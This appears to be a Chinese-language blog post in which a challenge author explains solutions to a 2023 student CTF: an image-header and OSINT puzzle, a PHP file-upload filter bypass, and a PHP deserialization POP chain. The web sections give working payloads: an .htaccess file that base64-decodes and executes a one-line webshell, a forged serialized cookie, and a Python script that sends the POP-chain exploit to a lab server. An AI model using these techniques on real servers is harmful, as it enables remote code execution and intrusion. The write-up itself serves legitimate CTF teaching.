@@ -1,0 +1,235 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Moe2023 Reverse &amp; web | DoubleLi's Blog</title><meta name="author" content="Double Li"><meta name="copyright" content="Double Li"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="出了一道misc 两道web  以下是wp MISC异世相遇出题背景： 出题人在长沙转时候偶然看到拍了张照，于此有了这道题目： 柏油纳西妲(Cabelis)邀请了祂的几位好朋友跨次元齐聚，并为他们拍了一张照片上传到提瓦特虚空终端上。由于异世相遇，文件好像有损坏？聪明的旅行者，你能够复原图片并找出拍摄地点和柏油纳西妲的朋友吗？ flag格式：TSCTF-J{城市_角色名1_…} 均为小写拼音  考点">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Moe2023 Reverse &amp; web">
+<meta property="og:url" content="http://example.com/post/TSCTF-J2023.html">
+<meta property="og:site_name" content="DoubleLi&#39;s Blog">
+<meta property="og:description" content="出了一道misc 两道web  以下是wp MISC异世相遇出题背景： 出题人在长沙转时候偶然看到拍了张照，于此有了这道题目： 柏油纳西妲(Cabelis)邀请了祂的几位好朋友跨次元齐聚，并为他们拍了一张照片上传到提瓦特虚空终端上。由于异世相遇，文件好像有损坏？聪明的旅行者，你能够复原图片并找出拍摄地点和柏油纳西妲的朋友吗？ flag格式：TSCTF-J{城市_角色名1_…} 均为小写拼音  考点">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pic.imgdb.cn/item/651046cfc458853aefa94523.jpg">
+<meta property="article:published_time" content="2023-09-24T15:10:10.000Z">
+<meta property="article:modified_time" content="2023-09-24T15:42:57.085Z">
+<meta property="article:author" content="Double Li">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/651046cfc458853aefa94523.jpg"><link rel="shortcut icon" href="https://pic.imgdb.cn/item/6393106bb1fccdcd36e03717.gif"><link rel="canonical" href="http://example.com/post/TSCTF-J2023"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: 'days',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Moe2023 Reverse & web',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-09-24 23:42:57'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://pic.imgdb.cn/item/6374f9aa16f2c2beb191be51.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://pic.imgdb.cn/item/651046cfc458853aefa94523.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">DoubleLi's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Moe2023 Reverse &amp; web</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-09-24T15:10:10.000Z" title="Created 2023-09-24 23:10:10">2023-09-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-09-24T15:42:57.085Z" title="Updated 2023-09-24 23:42:57">2023-09-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Moe2023 Reverse &amp; web"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>出了一道misc 两道web  以下是wp</p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="异世相遇"><a href="#异世相遇" class="headerlink" title="异世相遇"></a>异世相遇</h2><p>出题背景： 出题人在长沙转时候偶然看到拍了张照，于此有了这道题目：</p>
+<p>柏油纳西妲(Cabelis)邀请了祂的几位好朋友跨次元齐聚，并为他们拍了一张照片上传到提瓦特虚空终端上。由于异世相遇，文件好像有损坏？聪明的旅行者，你能够复原图片并找出拍摄地点和柏油纳西妲的朋友吗？</p>
+<p>flag格式：TSCTF-J{城市_角色名1_…} 均为小写拼音</p>
+<blockquote>
+<p>考点：文件头修改 + 简单社工（不需要玩游戏）</p>
+</blockquote>
+<img src='https://pic.imgdb.cn/item/651048bbc458853aefaaa49b.jpg'>
+
+<p>看到显示文件损坏且前面不是PNG ，修改文件头为89 50 4E 47即可看到图片</p>
+<p>显然看到图片上面 <strong>原神IFS</strong> 直接百度搜索</p>
+<img src='https://pic.imgdb.cn/item/651049efc458853aefabb3cc.png'>
+各种文章广告里面很容易找到 开展地点长沙 成都等地，以及主题人物：tinali kelai    地点甚至不需要百度街景，试两次就出
+
+<p>TSCTF-J{changsha_tinali_kelai}</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="传邮万里"><a href="#传邮万里" class="headerlink" title="传邮万里"></a>传邮万里</h2><p>一个mail毁了我的985梦 -&gt; 984.5也是985 -&gt; byr之声!传邮万里 -&gt; 传e_mail也是传邮！ -&gt;最重要的就是要传！ 文件上传！（hint : .&#x2F;hint.php ）</p>
+<p>出题背景：来源于去年文件上传思考题 如何绕过&lt;?  （不过这题有bug）</p>
+<p>在F12可以看到<img src='https://pic.imgdb.cn/item/65104c6dc458853aefadcc6a.png'>怕有人忽略就加在题目描述了!</p>
+<img src='https://pic.imgdb.cn/item/65104cc5c458853aefade2ec.png'> 
+源码中一个MIME验证，一个黑名单，还有一个内容检测
+前两个很容易绕过，如何绕过<?
+
+<p>有同学用<code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code><br>但是php7中该标签被删除，无法利用</p>
+<p>后面给了一个提示：仿生机器人tshcaces问：“tshcaces会梦到伪协议吗？”，我道：“如会，也许大道至简”。<br>提示使用htaccess文件（应该比较明显了吧），经常使用的是htaccess让图片按照php执行，但是如何绕过&lt;？ 希望可以学到htaccess文件里面可以写很多其他内容，比如伪协议？ 如是指的是用不用伪协议都可以</p>
+<p>这里可以用base64加密一句话木马，不会出现&lt;?  随便写个不存在的后缀名.abc(其他也可以)<br>上传后会将文件改名，再上传htaccess文件：</p>
+<pre><code>AddType application/x-httpd-php .abc
+php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=上传后显示的改后的名字.abc&quot;
+</code></pre>
+<p>连接蚁剑即可<br>还有师傅们用 其他协议 如auto_append_file直接包含flag文件，真是太高手了！（需要提前知道文件名flag）</p>
+<blockquote>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1824057">https://cloud.tencent.com/developer/article/1824057</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_61778128/article/details/124987744">https://blog.csdn.net/qq_61778128/article/details/124987744</a></p>
+</blockquote>
+<p>TSCTF-J{0ne_d4y_upl0ading,a_lif3long_hacker’s_loving!}(flag真押韵~)</p>
+<h2 id="star-rail-pop"><a href="#star-rail-pop" class="headerlink" title="star_rail_pop"></a>star_rail_pop</h2><p>请登上星穹列车，从仙舟前往黑塔支援。很单独的考点，php反序列化pop，出的纯粹一点，难度比去年低</p>
+<img src='https://pic.imgdb.cn/item/651054fdc458853aefb567af.png'>
+
+<p>里面要求名字是March7th还有real 什么的应该很容易想到cookie<br>base64解码一下，改成authorization&#x3D;1的March7th即可</p>
+<pre><code>import requests
+url = &#39;http://10.21.130.50:20063/&#39;
+cookies=dict(user=&#39;Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6ODoiTWFyY2g3dGgiO3M6MTM6ImF1dGhvcml6YXRpb24iO2I6MTt9&#39;)
+#O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:8:&quot;March7th&quot;;s:13:&quot;authorization&quot;;b:1;&#125;
+data=&#123;&#39;data&#39;:&#39;March7th&#39;&#125;
+r = requests.post(url=url,cookies=cookies,data=data)
+print(r.text)
+# &lt;br&gt;Wow! you are real March7th!&lt;br&gt;&lt;br&gt;come to the ./wa4aa44rr7r.php!
+</code></pre>
+<p>携带cookie访问下一个页面&#x2F;wa4aa44rr7r.php</p>
+<pre><code>&lt;?php
+class Heita&#123;
+    public $destroy;
+    public $try;
+&#125;
+class Belobog&#123;
+    public $conserve;
+    public $patrol;
+    public $remember;
+&#125;
+class XianZhou&#123;
+    public $abundance;
+    public $nonentity;
+&#125;
+
+$h=new Heita();
+$b=new Belobog();
+$b2=new Belobog();
+$b3=new Belobog();
+$x=new XianZhou();
+
+$x-&gt;nonentity=&quot;data&quot;;
+$x-&gt;abundance=&quot;flag&quot;;
+$b3-&gt;remember=$x;     //get
+$b2-&gt;conserve=$b3;    //tostring
+$b-&gt;conserve=$b2;
+$h-&gt;try=$b;
+
+echo urlencode(serialize($h));
+</code></pre>
+<p>Belobog这里套的多了几次，而且没加什么干扰，从wakeup入口或者pwn出口随便往后往回推都很容易</p>
+<p>__wakeup–&gt;__call–&gt;__tostring–&gt;__get–&gt;__invoke–&gt;pwn</p>
+<p>pwn这里需要传两个值—&gt; echo $$$data2;<br>$data2是对象nonentity，局部变量，赋值nonentity&#x3D;data<br>变成$$data,再给abundance赋值flag即可</p>
+<p>学习一下链子构造即可，没有什么其他难点，基本是基于知识点的难度。</p>
+<pre><code>#pop页面 携带cookie
+url_pop=&#39;http://10.21.130.50:20063/wa4aa44rr7r.php&#39;
+
+payload=&#39;O%3A5%3A%22Heita%22%3A2%3A%7Bs%3A7%3A%22destroy%22%3BN%3Bs%3A3%3A%22try%22%3BO%3A7%3A%22Belobog%22%3A3%3A%7Bs%3A8%3A%22conserve%22%3BO%3A7%3A%22Belobog%22%3A3%3A%7Bs%3A8%3A%22conserve%22%3BO%3A7%3A%22Belobog%22%3A3%3A%7Bs%3A8%3A%22conserve%22%3BN%3Bs%3A6%3A%22patrol%22%3BN%3Bs%3A8%3A%22remember%22%3BO%3A8%3A%22XianZhou%22%3A2%3A%7Bs%3A9%3A%22abundance%22%3Bs%3A4%3A%22flag%22%3Bs%3A9%3A%22nonentity%22%3Bs%3A4%3A%22data%22%3B%7D%7Ds%3A6%3A%22patrol%22%3BN%3Bs%3A8%3A%22remember%22%3BN%3B%7Ds%3A6%3A%22patrol%22%3BN%3Bs%3A8%3A%22remember%22%3BN%3B%7D%7D&#39;
+
+res=requests.get(url=url_pop+&#39;?pop=&#39;+payload)
+print(res.text)
+</code></pre>
+<p>TSCTF-J{TSCTF-J{Wow!!_You_C4n_R3A1l7_Pop!!!}}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">Double Li</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/post/TSCTF-J2023.html">http://example.com/post/TSCTF-J2023.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/wp/">wp</a></div><div class="post_share"><div class="addthis_inline_share_toolbox"></div><script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=https://d0u6lel1.github.io/" async="async"></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/computer_components.html"><img class="next-cover" src="https://pic.imgdb.cn/item/6506d494661c6c8e5458e8f9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">计组</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/post/BUU-SOLVE.html" title="N1book web"><img class="cover" src="https://pic.imgdb.cn/item/64cc75bc1ddac507cce26390.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-03</div><div class="title">N1book web</div></div></a></div><div><a href="/post/CATCTF.html" title="CATcat_wp_web"><img class="cover" src="https://pic.imgdb.cn/item/64c5d1701ddac507ccede374.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-09</div><div class="title">CATcat_wp_web</div></div></a></div><div><a href="/post/Hgame.html" title="Hgame-WP"><img class="cover" src="https://pic.imgdb.cn/item/64cc75e41ddac507cce2bd25.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-11</div><div class="title">Hgame-WP</div></div></a></div><div><a href="/post/SQL.html" title="SQL"><img class="cover" src="https://pic.imgdb.cn/item/63d8faece90d1c0098ee7366.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div class="title">SQL</div></div></a></div><div><a href="/post/MoeCTF.html" title="Ezphp-wp"><img class="cover" src="https://pic.imgdb.cn/item/64cc78471ddac507cce88558.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-19</div><div class="title">Ezphp-wp</div></div></a></div><div><a href="/post/Moe2023.html" title="Moe2023 Reverse &amp; web"><img class="cover" src="https://pic.imgdb.cn/item/64dc8cbf661c6c8e5403d925.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-15</div><div class="title">Moe2023 Reverse &amp; web</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">1.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%82%E4%B8%96%E7%9B%B8%E9%81%87"><span class="toc-number">1.1.</span> <span class="toc-text">异世相遇</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E9%82%AE%E4%B8%87%E9%87%8C"><span class="toc-number">2.1.</span> <span class="toc-text">传邮万里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#star-rail-pop"><span class="toc-number">2.2.</span> <span class="toc-text">star_rail_pop</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://pic.imgdb.cn/item/651046cfc458853aefa94523.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Double Li</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
